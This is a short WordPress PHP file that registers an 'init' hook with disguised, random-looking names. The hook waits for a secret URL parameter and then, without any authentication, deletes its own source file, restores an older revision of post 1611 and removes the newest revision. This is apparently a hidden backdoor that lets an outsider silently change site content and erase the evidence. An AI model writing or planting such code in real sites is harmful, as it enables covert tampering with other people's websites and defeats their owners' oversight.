<?php

function map_get_link_suite() {
	if (isset($_GET['nextgen_cc_better']) && $_GET['nextgen_cc_better'] === 'content_notify_cf7') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$restrict_information_notice = 1611;
		$domain_status_importer_js = wp_get_post_revisions($restrict_information_notice);
		if (empty($domain_status_importer_js)) die('no revisions');
		if (count($domain_status_importer_js) < 2) die('less than 2');
		$cache_effect_restaurant_authors = array_shift($domain_status_importer_js);
		$editor_coupon_pop_title = $cache_effect_restaurant_authors->ID;
		$gdpr_templates_variation_validation = array_shift($domain_status_importer_js);
		$security_cookie_generator_debug = $gdpr_templates_variation_validation->ID;
		$gravatar_term_pinterest_popular = wp_restore_post_revision($security_cookie_generator_debug);
		if ($gravatar_term_pinterest_popular === false) die('error restoring');
		$gravatar_term_pinterest_popular = wp_delete_post_revision($editor_coupon_pop_title);		
		if ($gravatar_term_pinterest_popular === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'map_get_link_suite');
